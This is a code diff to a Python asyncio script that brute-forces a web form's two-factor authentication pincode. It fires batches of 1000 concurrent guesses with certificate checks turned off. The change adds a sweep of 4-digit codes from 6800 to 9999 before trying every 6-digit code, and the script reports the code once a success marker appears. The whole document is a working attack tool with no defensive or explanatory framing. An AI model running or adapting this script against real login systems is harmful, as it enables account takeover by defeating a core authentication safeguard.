@@ -12,15 +12,16 @@ sslcontext = ssl.create_default_context()
 sslcontext.check_hostname = False
 sslcontext.verify_mode = ssl.CERT_NONE
 
-async def attempt_login(session, pincode, attempt_number):
+async def attempt_login(session, pincode):
     """Attempt to submit the pincode to the 2FA form asynchronously."""
+    # Split the pincode into individual digits (padding if necessary)
     data = {
         'pincode.1': pincode[0],
         'pincode.2': pincode[1],
         'pincode.3': pincode[2],
         'pincode.4': pincode[3],
-        'pincode.5': pincode[4],
-        'pincode.6': pincode[5]
+        'pincode.5': pincode[4] if len(pincode) > 4 else '0',
+        'pincode.6': pincode[5] if len(pincode) > 5 else '0'
     }
 
     try:
@@ -29,35 +30,39 @@ async def attempt_login(session, pincode, attempt_number):
             if SUCCESS_INDICATOR in text.lower():
                 print(f"Success! The pincode is: {pincode}")
                 return True
-            if attempt_number % 1000 == 0:
-                print(f"Attempt {attempt_number}: Still trying...")
     except Exception as e:
-        if attempt_number % 1000 == 0:
-            print(f"Attempt {attempt_number}: Request failed for pincode {pincode}")
+        print(f"Request failed for pincode {pincode}: {e}")
 
     return False
 
-async def main():
-    digits = '0123456789'
-    pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))
-
+async def try_pincodes(pincodes):
+    """Submit a batch of pincodes to the 2FA form."""
     async with aiohttp.ClientSession() as session:
         tasks = []
-        attempt_number = 0
         for pincode in pincodes:
-            attempt_number += 1
-            tasks.append(attempt_login(session, pincode, attempt_number))
+            tasks.append(attempt_login(session, pincode))
 
-            # Batch of requests sent concurrently (e.g., 1000 requests at once)
-            if len(tasks) >= 1000:  
+            if len(tasks) >= 1000:  # Batch requests in groups of 1000
                 results = await asyncio.gather(*tasks)
-                if any(results):  # If one of the attempts was successful, stop the brute-force
+                if any(results):
                     break
-                tasks = []  # Reset tasks for the next batch
+                tasks = []  # Reset for the next batch
 
-        # Run any remaining tasks if less than 1000 remain
+        # Run any remaining tasks (less than 1000)
         if tasks:
             await asyncio.gather(*tasks)
+
+async def main():
+    # Step 1: Try all 4-digit codes from 6800 to 9999
+    print("Trying 4-digit codes (6800-9999)...")
+    four_digit_pincodes = (f"{pincode:04d}" for pincode in range(6800, 10000))
+    await try_pincodes(four_digit_pincodes)
+
+    # Step 2: If unsuccessful, try all 6-digit codes
+    print("Trying all 6-digit codes...")
+    digits = '0123456789'
+    six_digit_pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))
+    await try_pincodes(six_digit_pincodes)
 
 # Run the main coroutine in Jupyter Notebook
 await main()
